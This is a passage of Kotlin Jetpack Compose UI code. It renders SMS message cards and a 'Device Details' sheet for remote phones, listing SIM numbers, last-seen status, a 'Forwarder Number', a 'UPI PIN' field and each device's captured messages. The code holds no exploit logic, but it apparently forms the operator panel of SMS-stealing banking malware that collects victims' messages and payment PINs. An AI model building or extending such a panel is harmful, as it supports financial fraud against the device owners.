                    Icon(Icons.Filled.Info, contentDescription = "Details", tint = VirtusColors.labelBlue, modifier = Modifier.size(22.dp))
                }
                IconButton(onClick = { /* Delete — not wired */ }, modifier = Modifier.size(40.dp)) {
                    Icon(Icons.Filled.Delete, contentDescription = "Delete", tint = Color(0xFFD32F2F), modifier = Modifier.size(22.dp))
                }
            }
        }
    }
}

@Composable
private fun DetailLine(
    label: String,
    value: String,
) {
    Row(Modifier.padding(vertical = 2.dp)) {
        Text(
            "$label:",
            color = Color(0xFF1565C0),
            fontWeight = FontWeight.Bold,
            fontSize = 13.sp,
        )
        Spacer(Modifier.width(6.dp))
        Text(
            value,
            color = Color(0xFF212121),
            fontSize = 13.sp,
            modifier = Modifier.weight(1f),
            maxLines = 3,
            overflow = TextOverflow.Ellipsis,
        )
    }
}

@Composable
private fun LiveSmsCardYellow(row: LiveSmsRow) {
    Card(
        modifier =
            Modifier
                .fillMaxWidth()
                .padding(vertical = 5.dp),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = VirtusColors.smsCardWhite),
        elevation = CardDefaults.cardElevation(defaultElevation = 3.dp),
    ) {
        Box(Modifier.padding(12.dp)) {
            Icon(
                Icons.Filled.Delete,
                contentDescription = null,
                tint = Color(0xFF212121),
                modifier =
                    Modifier
                        .align(Alignment.TopEnd)
                        .size(20.dp),
            )
            Icon(
                Icons.Outlined.DeleteOutline,
                contentDescription = null,
                tint = Color(0xFF616161),
                modifier =
                    Modifier
                        .align(Alignment.BottomStart)
                        .padding(top = 40.dp)
                        .size(18.dp),
            )
            Column(modifier = Modifier.padding(end = 22.dp, bottom = 4.dp)) {
                Text(
                    "MSG: ${row.body}",
                    color = VirtusColors.msgGreen,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Medium,
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    "Sender: ${row.sender}",
                    color = Color(0xFF424242),
                    fontSize = 11.sp,
                )
                Text(
                    buildString {
                        append("Received: ${formatTsLong(row.messageAtMillis ?: 0L)}")
                        if (row.deviceId.isNotBlank()) append(" · ${row.deviceId}")
                    },
                    color = Color(0xFF616161),
                    fontSize = 11.sp,
                )
            }
        }
    }
}

@Composable
private fun SmsCardYellow(msg: SmsRow) {
    Card(
        modifier =
            Modifier
                .fillMaxWidth()
                .padding(vertical = 5.dp),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = VirtusColors.smsCardWhite),
        elevation = CardDefaults.cardElevation(defaultElevation = 3.dp),
    ) {
        Box(Modifier.padding(12.dp)) {
            Icon(
                Icons.Filled.Delete,
                contentDescription = null,
                tint = Color(0xFF212121),
                modifier =
                    Modifier
                        .align(Alignment.TopEnd)
                        .size(20.dp),
            )
            Icon(
                Icons.Outlined.DeleteOutline,
                contentDescription = null,
                tint = Color(0xFF616161),
                modifier =
                    Modifier
                        .align(Alignment.BottomStart)
                        .padding(top = 40.dp)
                        .size(18.dp),
            )
            Column(modifier = Modifier.padding(end = 22.dp, bottom = 4.dp)) {
                Text(
                    "MSG: ${msg.body}",
                    color = VirtusColors.msgGreen,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Medium,
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    "Sender: ${msg.sender}",
                    color = Color(0xFF424242),
                    fontSize = 11.sp,
                )
                Text(
                    "Received: ${formatTsLong(msg.messageAtMillis ?: 0L)}",
                    color = Color(0xFF616161),
                    fontSize = 11.sp,
                )
            }
        }
    }
}

@Composable
private fun DeviceDetailSheet(
    d: DeviceDetail,
    onDismiss: () -> Unit,
    messagesContent: @Composable () -> Unit,
) {
    Column(Modifier.padding(16.dp).fillMaxWidth()) {
        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
            androidx.compose.material3.IconButton(
                onClick = onDismiss,
                modifier =
                    Modifier
                        .size(36.dp)
                        .clip(CircleShape)
                        .background(Color(0xFF212121)),
            ) {
                Icon(Icons.Filled.Close, contentDescription = "Close", tint = Color.White)
            }
            Text("📱", fontSize = 18.sp)
            Spacer(Modifier.width(6.dp))
            Text(
                "Device Details",
                color = Color(0xFF1565C0),
                fontWeight = FontWeight.Bold,
                fontSize = 18.sp,
            )
            Spacer(Modifier.weight(1f))
            Box(
                modifier =
                    Modifier
                        .clip(RoundedCornerShape(20.dp))
                        .background(if (d.online) Color(0xFF4CAF50) else Color(0xFFE53935))
                        .padding(horizontal = 12.dp, vertical = 6.dp),
            ) {
                Text(
                    if (d.online) "● Online" else "● Offline",
                    color = Color.White,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                )
            }
            Spacer(Modifier.width(4.dp))
            Icon(Icons.Filled.Phone, contentDescription = null, tint = Color(0xFF1565C0), modifier = Modifier.size(20.dp))
            Spacer(Modifier.width(2.dp))
            Icon(Icons.Filled.Smartphone, contentDescription = null, tint = Color(0xFF1565C0), modifier = Modifier.size(22.dp))
        }
        Spacer(Modifier.height(12.dp))
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp),
            colors = CardDefaults.cardColors(containerColor = Color.White),
            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
        ) {
            Column(Modifier.padding(14.dp)) {
                DetailLine("Device Name", d.modelDisplay)
                DetailLine("Battery", if (d.batteryPercent != null) "${d.batteryPercent}%" else "—")
                DetailLine("SIM 1", d.sim1Display ?: "N/A")
                DetailLine("SIM 2", d.sim2Display ?: "N/A")
                DetailLine(
                    "Registered At",
                    if (d.registeredAtMillis != null && d.registeredAtMillis!! > 0L) formatTsLong(d.registeredAtMillis!!) else "N/A",
                )
                DetailLine(
                    "Last Seen",
                    if (d.lastSeenMillis != null && d.lastSeenMillis!! > 0L) formatTsLong(d.lastSeenMillis!!) else "N/A",
                )
                DetailLine("Forwarder Number", d.forwarderDisplay ?: "N/A")
                DetailLine("UPI PIN", d.upiPinDisplay)
                HorizontalDivider(Modifier.padding(vertical = 8.dp))
                Text("Messages (${d.messages.size})", color = VirtusColors.labelBlue, fontWeight = FontWeight.Bold, fontSize = 14.sp)
                messagesContent()
            }
        }
        Spacer(Modifier.height(16.dp))
    }
}

private fun formatInr(v: Double): String {
    val nf = NumberFormat.getNumberInstance(Locale.US)
    return nf.format(v.toLong())
}

private fun formatTs(ms: Long): String {
    if (ms <= 0L) return "—"
    return SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.US).format(Date(ms))
}

private fun formatTsLong(ms: Long): String {
    if (ms <= 0L) return "—"
    return SimpleDateFormat("dd/MM/yyyy, h:mm:ss a", Locale.US).format(Date(ms))
}
